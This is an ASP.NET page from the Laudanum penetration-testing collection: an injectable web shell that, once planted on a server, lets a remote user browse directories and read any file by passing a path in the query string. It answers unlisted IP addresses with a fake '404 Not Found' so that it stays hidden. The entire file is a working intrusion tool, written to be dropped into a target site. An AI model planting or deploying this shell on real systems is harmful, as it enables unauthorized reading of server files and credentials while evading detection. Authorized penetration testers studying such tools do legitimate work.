<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<html><head><title>Laudanum - File</title></head><body>
<script runat="server">

    /* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.com
***  laudanum@secureideas.com
***
***  Project Leads:
***         Kevin Johnson <kevin@secureideas.com>
***
*** Copyright 2012 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file allows browsing of the file system
*** Written by James Jardine <james@secureideas.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
********************************************************************************* */

    // ********************* Config entries below ***********************************
// IPs are enterable as individual addresses  
string[] allowedIPs = new string[3] {"::1", "192.168.1.1","127.0.0.1"};

// ***************** No editable content below this line **************************
bool allowed = false;
string dir = "";
string file = "";

void Page_Load(object sender, System.EventArgs e)
{

    foreach (string ip in allowedIPs)
    {
        if (HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] == ip)
        {
            allowed = true;
        }
    }

    if (!allowed)
    {
        die();
    }

    //dir = Request.QueryString["dir"] != null ? Request.QueryString["dir"] : Environment.SystemDirectory;
    dir = Request.QueryString["dir"] != null ? Request.QueryString["dir"] : Server.MapPath(".");
    file = Request.QueryString["file"] != null ? Request.QueryString["file"] : "";

    if (file.Length > 0)
    {
        if (System.IO.File.Exists(file))
        {
            writefile();
        }
    }
}

void writefile()
{
    Response.ClearContent();
    Response.Clear();
    Response.ContentType = "text/plain";
    //Uncomment the next line if you would prefer to download the file vs display it.
    //Response.AddHeader("Content-Disposition", "attachment; filename=" + file + ";");
    Response.TransmitFile(file);
    Response.Flush();
    Response.End();
}
    
void die() {
	//HttpContext.Current.Response.Clear();
	HttpContext.Current.Response.StatusCode = 404;
	HttpContext.Current.Response.StatusDescription = "Not Found";
	HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}


</script>
<html>
<head></head>
<% string[] breadcrumbs = dir.Split('\\');
   string breadcrumb = "";
   foreach (string b in breadcrumbs)
   {
       if (b.Length > 0)
       {
           breadcrumb += b + "\\";
           Response.Write("<a href=\"" + "file.aspx" + "?dir=" + Server.UrlEncode(breadcrumb) + "\">" + Server.HtmlEncode(b) + "</a>");
           Response.Write(" / ");
       }
   }
    %>
<table>
<tr><th>Name</th><th>Date</th><th>Size</th></tr>
<%
    try
    {
        if (System.IO.Directory.Exists(dir))
        {
            string[] folders = System.IO.Directory.GetDirectories(dir);
            foreach (string folder in folders)
            {
                Response.Write("<tr><td><a href=\"" + "file.aspx" + "?dir=" + Server.UrlEncode(folder) + "\">" + Server.HtmlEncode(folder) + "</a></td><td></td><td></td></tr>");
            }
        }
        else
        {
            Response.Write("This directory doesn't exist: " + Server.HtmlEncode(dir));
            Response.End();
        }
        
    }
    catch (System.UnauthorizedAccessException ex)
    {
        Response.Write("You Don't Have Access to this directory: " + Server.HtmlEncode(dir));
        Response.End();
    }
     %>

<%
    System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(dir);
    System.IO.FileInfo[] files = di.GetFiles();
    foreach (System.IO.FileInfo f in files)
    {
        Response.Write("<tr><td><a href=\"" + "file.aspx" + "?dir=" + Server.UrlEncode(dir) + "&file=" + Server.UrlEncode(f.FullName) + "\">" + Server.HtmlEncode(f.Name) + "</a></td><td>" + f.CreationTime.ToString() + "</td><td>" + f.Length.ToString() + "</td></tr>");
    }
     %>
     </table>
     </body>
</html>